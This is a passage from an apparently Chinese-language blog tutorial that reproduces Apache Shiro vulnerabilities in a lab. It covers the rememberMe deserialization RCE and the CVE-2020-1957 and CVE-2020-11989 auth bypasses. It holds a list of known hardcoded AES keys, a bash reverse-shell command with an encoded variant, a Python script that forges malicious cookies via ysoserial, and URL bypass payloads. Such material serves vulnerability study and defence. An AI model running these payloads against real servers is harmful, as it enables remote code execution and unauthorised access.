class="line">随后在服务器端会相反的进行base64解码=&gt;AES解密=&gt;反序列化</span><br><span class="line">AES加密为对称加密，加密解密需要同一个密钥，重点就是AES密钥的获取</span><br><span class="line">其中1.2.4默认密钥kPH+bIxk5D2deZiIxcaaaA==</span><br></pre></td></tr></table></figure><p>在这个过程中，我们发现AES密钥非常关键，但密钥被硬编码到了代码中，也就是说加密密钥Key编码在源码内。只要可以拿到源代码就可以拿到这个Key，只要得到默认的key，就可以被利用构造任意cookie，从而进行shiro的反序列化攻击。但是在Shiro1.2.5以上，官方已经修复了这个漏洞，已经拿不到KEY了。因此，在得到key的情况下攻击者可以构造一个恶意对象，并且进行序列化=&gt;AES加密=&gt;base64编码后，作为cookie中rememberMe字段进行发送，Shiro将收到的rememberMe字段进行base64解码=&gt;AES解密=&gt;反序列化后，最终执行了一个恶意代码指令，在目标服务器上执行任意命令造成反序列化RCE漏洞。注意，前提是需要有合法用户，为什么需要RememberMecookie是因为Shiro会先获取用户信息，当存在有效的用户信息时才会进入下一阶段的流程。<br>通过上面的知识知道要利用这个漏洞必须构造出一个可以让服务器反序列化的恶意对象。</p><ul><li>影响版本ApacheShiro&lt;=1.2.4</li><li> <strong>漏洞利用条件</strong>：</li><li>已知ShiroAES解密密钥。</li><li>开启RememberMe功能。</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br></pre></td><td class="code"><pre><span class="line">一些收集到的key字典:</span><br><span class="line">kPH+bIxk5D2deZiIxcaaaA==</span><br><span class="line">4AvVhmFLUs0KTA3Kprsdag==</span><br><span class="line">Z3VucwAAAAAAAAAAAAAAAA==</span><br><span class="line">fCq+/xW488hMTCD+cmJ3aQ==</span><br><span class="line">0AvVhmFLUs0KTA3Kprsdag==</span><br><span class="line">1AvVhdsgUs0FSA3SDFAdag==</span><br><span class="line">1QWLxg+NYmxraMoxAXu/Iw==</span><br><span class="line">25BsmdYwjnfcWmnhAciDDg==</span><br><span class="line">2AvVhdsgUs0FSA3SDFAdag==</span><br><span class="line">3AvVhmFLUs0KTA3Kprsdag==</span><br><span class="line">3JvYhmBLUs0ETA5Kprsdag==</span><br><span class="line">r0e3c16IdVkouZgk1TKVMg==</span><br><span class="line">5aaC5qKm5oqA5pyvAAAAAA==</span><br><span class="line">5AvVhmFLUs0KTA3Kprsdag==</span><br><span class="line">6AvVhmFLUs0KTA3Kprsdag==</span><br><span class="line">6NfXkC7YVCV5DASIrEm1Rg==</span><br><span class="line">6ZmI6I2j5Y+R5aSn5ZOlAA==</span><br><span class="line">cmVtZW1iZXJNZQAAAAAAAA==</span><br><span class="line">7AvVhmFLUs0KTA3Kprsdag==</span><br><span class="line">8AvVhmFLUs0KTA3Kprsdag==</span><br><span class="line">8BvVhmFLUs0KTA3Kprsdag==</span><br><span class="line">9AvVhmFLUs0KTA3Kprsdag==</span><br><span class="line">OUHYQzxQ/W9e/UjiAGu6rg==</span><br><span class="line">a3dvbmcAAAAAAAAAAAAAAA==</span><br><span class="line">aU1pcmFjbGVpTWlyYWNsZQ==</span><br><span class="line">bWljcm9zAAAAAAAAAAAAAA==</span><br><span class="line">bWluZS1hc3NldC1rZXk6QQ==</span><br><span class="line">bXRvbnMAAAAAAAAAAAAAAA==</span><br><span class="line">ZUdsaGJuSmxibVI2ZHc9PQ==</span><br><span class="line">wGiHplamyXlVB11UXWol8g==</span><br><span class="line">U3ByaW5nQmxhZGUAAAAAAA==</span><br><span class="line">MTIzNDU2Nzg5MGFiY2RlZg==</span><br><span class="line">L7RioUULEFhRyxM7a2R/Yg==</span><br><span class="line">a2VlcE9uR29pbmdBbmRGaQ==</span><br><span class="line">WcfHGU25gNnTxTlmJMeSpw==</span><br><span class="line">OY//C4rhfwNxCQAQCrQQ1Q==</span><br><span class="line">5J7bIJIV0LQSN3c9LPitBQ==</span><br><span class="line">f/SY5TIve5WWzT4aQlABJA==</span><br><span class="line">bya2HkYo57u6fWh5theAWw==</span><br><span class="line">WuB+y2gcHRnY2Lg9+Aqmqg==</span><br><span class="line">kPv59vyqzj00x11LXJZTjJ2UHW48jzHN</span><br><span class="line">3qDVdLawoIr1xFd6ietnwg==</span><br><span class="line">ZWvohmPdUsAWT3=KpPqda</span><br><span class="line">YI1+nBV//m7ELrIyDHm6DQ==</span><br><span class="line">6Zm+6I2j5Y+R5aS+5ZOlAA==</span><br><span class="line">2A2V+RFLUs+eTA3Kpr+dag==</span><br><span class="line">6ZmI6I2j3Y+R1aSn5BOlAA==</span><br><span class="line">SkZpbmFsQmxhZGUAAAAAAA==</span><br><span class="line">2cVtiE83c4lIrELJwKGJUw==</span><br><span class="line">fsHspZw/92PrS3XrPW+vxw==</span><br><span class="line">XTx6CKLo/SdSgub+OPHSrw==</span><br><span class="line">sHdIjUN6tzhl8xZMG3ULCQ==</span><br><span class="line">O4pdf+7e+mZe8NyxMTPJmQ==</span><br><span class="line">HWrBltGvEZc14h9VpMvZWw==</span><br><span class="line">rPNqM6uKFCyaL10AK51UkQ==</span><br><span class="line">Y1JxNSPXVwMkyvES/kJGeQ==</span><br><span class="line">lT2UvDUmQwewm6mMoiw4Ig==</span><br><span class="line">MPdCMZ9urzEA50JDlDYYDg==</span><br><span class="line">xVmmoltfpb8tTceuT5R7Bw==</span><br><span class="line">c+3hFGPjbgzGdrC+MHgoRQ==</span><br><span class="line">ClLk69oNcA3m+s0jIMIkpg==</span><br><span class="line">Bf7MfkNR0axGGptozrebag==</span><br><span class="line">1tC/xrDYs8ey+sa3emtiYw==</span><br><span class="line">ZmFsYWRvLnh5ei5zaGlybw==</span><br><span class="line">cGhyYWNrY3RmREUhfiMkZA==</span><br><span class="line">IduElDUpDDXE677ZkhhKnQ==</span><br><span class="line">yeAAo1E8BOeAYfBlm4NG9Q==</span><br><span class="line">cGljYXMAAAAAAAAAAAAAAA==</span><br><span class="line">2itfW92XazYRi5ltW0M2yA==</span><br><span class="line">XgGkgqGqYrix9lI6vxcrRw==</span><br><span class="line">ertVhmFLUs0KTA3Kprsdag==</span><br><span class="line">5AvVhmFLUS0ATA4Kprsdag==</span><br><span class="line">s0KTA3mFLUprK4AvVhsdag==</span><br><span class="line">hBlzKg78ajaZuTE0VLzDDg==</span><br><span class="line">9FvVhtFLUs0KnA3Kprsdyg==</span><br><span class="line">d2ViUmVtZW1iZXJNZUtleQ==</span><br><span class="line">yNeUgSzL/CfiWw1GALg6Ag==</span><br><span class="line">NGk/3cQ6F5/UNPRh8LpMIg==</span><br><span class="line">4BvVhmFLUs0KTA3Kprsdag==</span><br><span class="line">MzVeSkYyWTI2OFVLZjRzZg==</span><br><span class="line">CrownKey==a12d/dakdad</span><br><span class="line">empodDEyMwAAAAAAAAAAAA==</span><br><span class="line">A7UzJgh1+EWj5oBFi+mSgw==</span><br><span class="line">YTM0NZomIzI2OTsmIzM0NTueYQ==</span><br><span class="line">c2hpcm9fYmF0aXMzMgAAAA==</span><br><span class="line">i45FVt72K2kLgvFrJtoZRw==</span><br><span class="line">U3BAbW5nQmxhZGUAAAAAAA==</span><br><span class="line">ZnJlc2h6Y24xMjM0NTY3OA==</span><br><span class="line">Jt3C93kMR9D5e8QzwfsiMw==</span><br><span class="line">MTIzNDU2NzgxMjM0NTY3OA==</span><br><span class="line">vXP33AonIp9bFwGl7aT7rA==</span><br><span class="line">V2hhdCBUaGUgSGVsbAAAAA==</span><br><span class="line">Z3h6eWd4enklMjElMjElMjE=</span><br><span class="line">Q01TX0JGTFlLRVlfMjAxOQ==</span><br><span class="line">ZAvph3dsQs0FSL3SDFAdag==</span><br><span class="line">Is9zJ3pzNh2cgTHB4ua3+Q==</span><br><span class="line">NsZXjXVklWPZwOfkvk6kUA==</span><br><span class="line">GAevYnznvgNCURavBhCr1w==</span><br><span class="line">66v1O8keKNV3TTcGPK1wzg==</span><br><span class="line">SDKOLKn2J1j/2BHjeZwAoQ==</span><br></pre></td></tr></table></figure><h4 id="复现过程"><a href="#复现过程" class="headerlink" title="复现过程"></a>复现过程</h4><p>输入正确的账号密码，并选择“记住我”</p><p><img src="https://cdn.jsdelivr.net/gh/MTRleed/PicGo@master/2022/shiro%E5%A4%8D%E7%8E%B04.png"></p><p>使用bp抓取数据包，查看包内容，可以看到cookie里的rememberme</p><p><img src="https://cdn.jsdelivr.net/gh/MTRleed/PicGo@master/2022/shiro%E5%A4%8D%E7%8E%B03.png"></p><p>使用nc监听本地的1234端口，最终shell会反弹到这个端口</p><p><img src="https://cdn.jsdelivr.net/gh/MTRleed/PicGo@master/2022/shiro%E5%A4%8D%E7%8E%B05.png"></p><p>编码一下反弹shell的命令</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">bash-i&gt;&amp;/dev/tcp/192.168.1.6/12340&gt;&amp;1</span><br><span class="line"></span><br><span class="line">-i参数生成交互式shell</span><br><span class="line">&gt;&amp;把标准输入和标准输出重定向到socket</span><br><span class="line">/dev/tcp/192.168.1.6/1234表示bash会对/dev/tcp特殊处理，代表了一个tcpsocket</span><br><span class="line">0&gt;&amp;1将标准输入重定向到标准输出</span><br><span class="line">编码后：bash-c&#123;<span class="built_in">echo</span>,YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjEuNi8xMjM0IDA+JjE=&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;</span><br></pre></td></tr></table></figure><p>注：为什么要对反弹shell进行编码？<br>在exec()函数中，”&gt;”管道符是没有意义的，会被解析为其他的意义，而我们的反弹shell命令中又必须使用，所以需要编码。<br>另外，StringTokenizer类会破坏其中包含空格的参数，该类将命令字符串按空格分隔。诸如此类的东西ls”MyDirectory”将被解释为ls’”My’’Directory”‘，空格会失效</p><p>使用ysoserial中JRMP监听模块，监听6666端口并执行反弹shell命令</p><p><img src="https://cdn.jsdelivr.net/gh/MTRleed/PicGo@master/2022/shiro%E5%A4%8D%E7%8E%B02.png"></p><p>使用py脚本生成rememberMe值</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#shiro.py</span></span><br><span class="line">importsys</span><br><span class="line">importuuid</span><br><span class="line">importbase64</span><br><span class="line">importsubprocess</span><br><span class="line">fromCrypto.CipherimportAES</span><br><span class="line">defencode_rememberme(command):</span><br><span class="line">popen=subprocess.Popen([<span class="string">&#x27;java&#x27;</span>,<span class="string">&#x27;-jar&#x27;</span>,<span class="string">&#x27;ysoserial-sleep.jar&#x27;</span>,<span class="string">&#x27;JRMPClient&#x27;</span>,command],stdout=subprocess.PIPE)</span><br><span class="line">BS=AES.block_size</span><br><span class="line">pad=lambdas:s+((BS-<span class="built_in">len</span>(s)%BS)*<span class="built_in">chr</span>(BS-<span class="built_in">len</span>(s)%BS)).encode()</span><br><span class="line">key=base64.b64decode(<span class="string">&quot;kPH+bIxk5D2deZiIxcaaaA==&quot;</span>)//已知的key</span><br><span class="line">iv=uuid.uuid4().<span class="built_in">bytes</span></span><br><span class="line">encryptor=AES.new(key,AES.MODE_CBC,iv)</span><br><span class="line">file_body=pad(popen.stdout.read())</span><br><span class="line">base64_ciphertext=base64.b64encode(iv+encryptor.encrypt(file_body))</span><br><span class="line">returnbase64_ciphertext</span><br><span class="line">if__name__==<span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">payload=encode_rememberme(sys.argv[<span class="number">1</span>])</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;rememberMe=&#123;0&#125;&quot;</span>.<span class="built_in">format</span>(payload.decode()))</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/MTRleed/PicGo@master/2022/shiro%E5%A4%8D%E7%8E%B01.png"></p><p>将生成的rememberMe值替换原来的值，放包即可</p><p><img src="https://cdn.jsdelivr.net/gh/MTRleed/PicGo@master/2022/shiro%E5%A4%8D%E7%8E%B0.png"></p><p>反弹shell成功</p><h3 id="CVE-2020-1957-Apacheshiro-lt-1-5-2权限绕过漏洞"><a href="#CVE-2020-1957-Apacheshiro-lt-1-5-2权限绕过漏洞" class="headerlink" title="(CVE-2020-1957)Apacheshiro&lt;1.5.2权限绕过漏洞"></a>(CVE-2020-1957)Apacheshiro&lt;1.5.2权限绕过漏洞</h3><p>在SpringBoot中使用ApacheShiro进行身份验证、权限控制时，攻击者构造一个特殊的http请求，利用ApacheShiro拦截器和SpringBoot对URL(requestURI)的处理的差异化，可以绕过ApacheShiro对SpringBoot中的Servlet的权限控制，绕过Shiro的认证，可以未授权访问敏感路径。</p><h4 id="小知识"><a href="#小知识" class="headerlink" title="小知识"></a>小知识</h4><p>Shiro框架通过拦截器功能来实现对用户访问权限的控制和拦截。Shiro中常见的拦截器有<strong>anon</strong>，<strong>authc</strong>等拦截器。</p><ul><li>anon为匿名拦截器，不需要登录就能访问，一般用于静态资源,或者移动端接口</li><li>authc为登录拦截器，一般是需要登录认证才能访问的资源。</li></ul><p>用户可以在Shiro.ini编写匹配URL配置，对匹配的URL将进行拦截检查，这样就能实现对URL的访问控制，提高资源访问的安全性。例如，访问/index.html主页的时候，Shiro将不会对其进行登录判断，因为这是一个需要让访问者能够访问的静态页面，交给anon拦截器处理，此项资源不需要登录就能进行访问。而对于/user/1，/user/2，/user/3，/admin/*等资源接口，authc拦截器将会对其进行登录判断，只有登录认证才能访问资源，目的是保证操作的合法性。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">在shiro.ini配置文件中，可以这样配置：</span><br><span class="line">[urls]</span><br><span class="line">/index.html = anon</span><br><span class="line">/user/** = authc</span><br><span class="line">/admin/** = authc</span><br><span class="line">知识补充：</span><br><span class="line">Shiro的URL路径表达式为ANT格式，路径通配符支持?，*，**</span><br><span class="line">?：代表匹配一个字符</span><br><span class="line">*：代表匹配零个或多个字符串</span><br><span class="line">**：代表匹配路径中的零个或多个路径</span><br></pre></td></tr></table></figure><p>其中<code>*</code>表示匹配零个或多个字符串，<code>/*</code>可以匹配<code>/hello</code>，但匹配不到<code>/hello/</code>因为<code>*</code>通配符无法匹配路径。假设<code>/hello</code>接口设置了authc拦截器，访问<code>/hello</code>将会被进行权限判断，如果请求的URI为<code>/hello/</code>呢，<code>/*</code>URL路径表达式将无法正确匹配，放行。然后进入到spring(Servlet)拦截器，spring中<code>/hello</code>形式和<code>/hello/</code>形式的URL访问的资源是一样的。</p><table><thead><tr><th>URL路径</th><th align="center">说明</th></tr></thead><tbody><tr><td><code>/app/*.x</code></td><td align="center">匹配(Matches)所有在app路径下的.x文件</td></tr><tr><td><code>/app/p?ttern</code></td><td align="center">匹配(Matches)/app/pattern和/app/pXttern,但是不包括/app/pttern</td></tr><tr><td><code>/**/example</code></td><td align="center">匹配(Matches)/app/example,/app/foo/example,和/example</td></tr><tr><td><code>/app/**/dir/file.*</code></td><td align="center">匹配(Matches)/app/dir/file.jsp,/app/foo/dir/file.html,/app/foo/bar/dir/file.pdf,和/app/dir/file.java</td></tr><tr><td><code>/**/*.jsp</code></td><td align="center">匹配(Matches)任何的.jsp文件</td></tr></tbody></table><p>属性：<br>最长匹配原则(hasmorecharacters)<br>说明，URL请求<code>/app/dir/file.jsp</code>，现在存在两个路径匹配模式<code>/**/*.jsp和/app/dir/*.jsp</code>，那么会根据模式<code>/app/dir/*.jsp</code>来匹配</p><h4 id="复现过程-1"><a href="#复现过程-1" class="headerlink" title="复现过程"></a>复现过程</h4><h4 id="shiro-lt-1-5-0版本权限绕过"><a href="#shiro-lt-1-5-0版本权限绕过" class="headerlink" title="shiro&lt;1.5.0版本权限绕过"></a>shiro&lt;1.5.0版本权限绕过</h4><p>环境：<a href="https://github.com/lenve/javaboy-code-samples/tree/master/shiro/shiro-basic">https://github.com/lenve/javaboy-code-samples/tree/master/shiro/shiro-basic</a><br>将源码导入javaIDEA中</p><p>首先在pom.xml文件可以看到shiro的版本，把版本修改成1.5.0以下，也可以不修改。<br><img src="https://cdn.jsdelivr.net/gh/MTRleed/PicGo@master/2022/shiro1957-9.png"></p><p>来到main目录下ShiroConfig.java文件进行修改，将原来的拦截正则修改，添加authc的拦截正则。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">map.put(<span class="string">&quot;/hello/*&quot;</span>,<span class="string">&quot;authc&quot;</span>);<span class="comment">//访问/hello及以下目录都将由authc进行校验</span></span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/MTRleed/PicGo@master/2022/shiro1957-5.png"></p><p>来到LoginController.java文件，在这里修改路由控制器方法，我们选择添加一个方法，同时需要刷新一下Maven。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">importorg.springframework.web.bind.annotation.PathVariable;<span class="comment">//引入方法</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//方法的具体实现</span></span><br><span class="line"><span class="meta">@GetMapping(&quot;/hello/&#123;currentPage&#125;&quot;)</span></span><br><span class="line"></span><br><span class="line">publicStringhello(<span class="meta">@PathVariableIntegercurrentPage</span>)&#123;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span><span class="string">&quot;hello&quot;</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//访问成功后返回hello资源内容</span></span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/MTRleed/PicGo@master/2022/shiro1957-4.png"></p><p>运行ShiroBasicApplication.java文件<br><img src="https://cdn.jsdelivr.net/gh/MTRleed/PicGo@master/2022/shiro1957-6.png"></p><p>访问<a href="http://your-ip:8080/login%EF%BC%8C%E6%98%BE%E7%A4%BA%E6%8F%90%E7%A4%BA%E7%99%BB%E5%BD%95">http://your-ip:8080/login，显示提示登录</a><br><img src="https://cdn.jsdelivr.net/gh/MTRleed/PicGo@master/2022/shiro1957-7.png"></p><p>抓包重放查看<br><img src="https://cdn.jsdelivr.net/gh/MTRleed/PicGo@master/2022/shiro1957-1.png"></p><p>现在修改请求的URL，尝试正常访问需要鉴权的资源，显示是无法访问的<br><img src="https://cdn.jsdelivr.net/gh/MTRleed/PicGo@master/2022/shiro1957-2.png"></p><p>那么我们构造一下，在该资源的URL尾部添加<code>/</code><br><img src="https://cdn.jsdelivr.net/gh/MTRleed/PicGo@master/2022/shiro1957-3.png"><br><img src="https://cdn.jsdelivr.net/gh/MTRleed/PicGo@master/2022/shiro1957-8.png"></p><p>资源已经能够正常访问了，绕过了shiro的验证<br>当我们通过<strong>敏感路径扫描</strong>后，获取到无权限访问的敏感路径，再构造这样的路径末尾携带<code>/</code>URL将造成未授权访问。</p><p><strong>源码理解</strong></p><p>我们输入的URL首先进入org.apache.shiro.web.filter.mgt.PathMatchingFilterChainResolver的getChain方法中，被获取请求uri路径，随后触发pathMatches方法进行下一步匹配<br><img src="https://cdn.jsdelivr.net/gh/MTRleed/PicGo@master/2022/shiro1957-10.png"></p><p>pathPattern=/hello/*,requestURI=/hello/1/</p><p>后面最终会调用core.src.main.java.org.apache.shiro.util.AntPathMatcher类中的doMatch方法进行传入的requestURI与拦截器表达式进行匹配</p><p>但是，在上面已经提到<code>*</code>表示匹配零个或多个字符串，<code>/*</code>可以匹配<code>/hello</code>，但匹配不到<code>/hello/</code>因为<code>*</code>通配符无法匹配路径。假设<code>/hello</code>接口设置了authc拦截器，访问<code>/hello</code>将会被进行权限判断，如果请求的URI为<code>/hello/</code>呢，<code>/*</code>URL路径表达式将无法正确匹配，放行。所以如果Shiro拦截器表达式不以<code>/</code>结尾，且requestURI以<code>/</code>结尾，判断代码将返回false表示匹配失败，从而绕过Shiro认证。随后进入web框架的spring验证。</p><p>而spring的拦截器在在检测拦截器表达式与requestURI结尾是否为<code>/</code>之后，并没有直接返回false。而是将拦截器表达式结尾添加<code>/</code>，这时拦截器表达式就和我们构造的URL请求一致，所以spring显示匹配成功返回true，放行。</p><p>准确来说该身份验证绕过漏洞是spring＋shiro组合的漏洞，构造的请求要绕过shiro拦截器，还要绕过spring拦截器。但是这个漏洞在shiro-1.5.0版本中被修复了</p><h4 id="shiro-lt-1-5-2版本权限绕过"><a href="#shiro-lt-1-5-2版本权限绕过" class="headerlink" title="shiro&lt;1.5.2版本权限绕过"></a>shiro&lt;1.5.2版本权限绕过</h4><p>上面提到shiro-1.5.0的修复，其实在1.5.2以前的版本验证方式都差不多，所以归类为&lt;1.5.2的漏洞。<br>1.5.0的修复后效果：代码修复方式是通过判断requestURI是否以<code>/</code>为结尾，如果以/结尾的话，则去掉尾部的<code>/</code>符号再与shiro拦截器表达式进行比较。<br>当requestURI为<code>/hello/1/</code>等以<code>/</code>为结尾的URI的时候，都会被清除最后的<code>/</code>号，再进行URL路径匹配。</p><p><strong>简单说一下本此版本的漏洞形成原因：</strong><br>Shiro1.5.0-1.5.1版本在对requestURI的处理是这样的，以分号将传入的URI进行截断，并将分号以及分号后面的数据进行清空，返回分号前面的URI数据，从而让<code>/abc/..;/admin/</code>变为<code>/abc/..</code>，因为不存在<code>/admin/**</code>所以绕过shiro检验进入spring检验。</p><p>但是，Spring对分号处理的方式与Shiro不同，Spring会先获取分号的位置，并检测分号后是否存在<code>/</code>，如果有，将<code>/</code>的位置记录在slashIndex变量中，并将分号前的数据与<code>/</code>之后的数据进行拼接，从而让<code>/abc/..;/admin/</code>变为<code>/abc/../admin/</code>。随后处理，取有效正常路径等待，然后返回处理后的requestURI（此时为<code>/admin/</code>）进行匹配，放行，访问成功。</p><p>同样还是利用了spring+shiro组合中，两者对URL处理方式不同来实现绕过。</p><p>在后来的Shiro1.5.2版本中，在进行decodeAndCleanUriString方法之前会先进行URI解析，调用request.getServletPath()和request.getPathInfo()获取ServletPath和PathInfo并进行路径拼接，避开了spring的decodeAndCleanUriString对于分号的处理，从而修复了此漏洞。</p><p>​       </p><h3 id="CVE-2020-11989-Apacheshiro-lt-1-5-3权限绕过漏洞"><a href="#CVE-2020-11989-Apacheshiro-lt-1-5-3权限绕过漏洞" class="headerlink" title="(CVE-2020-11989)Apacheshiro&lt;1.5.3权限绕过漏洞"></a>(CVE-2020-11989)Apacheshiro&lt;1.5.3权限绕过漏洞</h3><p>此漏洞和CVE-2020-1957类似，都是因为shiro和spring对URL的处理不一致导致的。但是要求对admin资源的匹配符号为<code>*</code>不能是<code>**</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"> map.put(<span class="string">&quot;/doLogin&quot;</span>, <span class="string">&quot;anon&quot;</span>);</span><br><span class="line"> map.put(<span class="string">&quot;/admin/*&quot;</span>, <span class="string">&quot;authc&quot;</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@GetMapping(&quot;/admin/1&quot;)</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> String <span class="title">admin</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;admin&quot;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>测试项目部署于Tomcat。该漏洞成功利用存在下面两个条件：</p><ol><li>项目不能部署在根目录，也就是需要 context-path，设置server.servlet.context-path=/app，如果为根目录则context-path为空，就会被CVE-2020-1957的patch将URL格式化，值得注意的是若Shiro版本小于1.5.2的话那么该条件就不需要。</li><li>Spring控制器中没有另外的权限校验代码</li></ol><p><strong>简单解释漏洞****：</strong></p><p>首先有两种攻击方式：</p><p><strong>第一种</strong><br>获取到无权限访问的敏感路径，在authc认证路径后添加<code>%25%32%66</code>（就是将<code>/</code>进行两次URL编码）进行身份验证绕过。</p><p><strong>第二种</strong><br>获取到无权限访问的敏感路径，在路径的头部添加<code>/;/</code>进行身份验证绕过。</p><ul><li><p>在Shiro1.5.2版本中，对于requestURI处理的方式存在一些不同，对URL进行两次解码，此处也是漏洞触发点所在。Shiro1.5.2使用的是request.getContextPath()，request.getServletPath()，request.getPathInfo()拼接的方式。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">request.getRequestURL()：返回全路径；</span><br><span class="line">request.getRequestURI()：返回除去Host部分的路径；</span><br><span class="line">request.getContextPath()：返回工程名部分，如果工程映射为/，则返回为空；</span><br><span class="line">request.getServletPath()：返回除去Host和工程名部分的路径；</span><br><span class="line">request.getPathInfo()：仅返回传递到Servlet的路径，如果没有传递额外的路径信息，则此返回Null；</span><br></pre></td></tr></table></figure><p>假设我们构造URL为/admin/a%25%32%66a由于getServletPath()方法会对requestURI进行一次url解码，在之后的decodeAndCleanUriString方法中进行第二次url解码，所以shiro检测的是/admin/a/a,不在匹配范围内，放行进入到spring boot 。Spring是怎么对其进行解析的，在org.s-pringframework.web.uti.UrlPathHelper#getPathWithinApplication中，将url解析为/toJsonList/a%2fa，还没解码完的URL被当做{name}了，这样其实就表示/admin/{name}中的name值为a%2fa，符合匹配规则，放行。<br>解释一下就是<code>/**</code> 之类的路径匹配配置，匹配路径下的全部访问请求，包括子目录及后面的请求，如：/admin/** 可以匹配 /admin/a 或者 /admin/b/c/d 等请求。</p><p>对于<code>/*</code>的话 ，单个不能跨目录，只能在两个/之间匹配任意数量的字符，如/admin/* 可以匹配 /admin/a 但是不能匹配 /admin/b/c/d。</p><p>所以如果我们将其配置为/admin/*，但是我们访问形如admin/a/b这种路径，此时就会绕过访问权限。</p></li><li><p>我们访问 /;/app/admin/1，最终将成功访问到/app/admin/1这个需要验证身份的资源。利用CVE-2020-1957漏洞原理，shiro以分号截断，所以会将<code>/</code>拿去检验，放行，进入spring，而spring则会截断reqeustURI中分号后的数据，并返回，最终变成选取正确访问路径访问</p><p>当 URL 进入到 Tomcat 时， Tomcat 判断 /;/app/admin/1 为 app 下的 /admin/page  路由，进入到 Shiro 时被 ; 截断被认作为 / ，不再检验,再进入 Spring 时又被正确处理为正常路径app下的 /admin/1  路由，最后导致 Shiro 的权限绕过。</p></li></ul><p>​        </p><h3 id="CVE-2020-13933-Apacheshiro-lt-1-6-0权限绕过漏洞"><a href="#CVE-2020-13933-Apacheshiro-lt-1-6-0权限绕过漏洞" class="headerlink" title="(CVE-2020-13933)Apacheshiro&lt;1.6.0权限绕过漏洞"></a>(CVE-2020-13933)Apacheshiro&lt;1.6.0权限绕过漏洞</h3><p>漏洞简介：<code>Apahce Shiro</code> 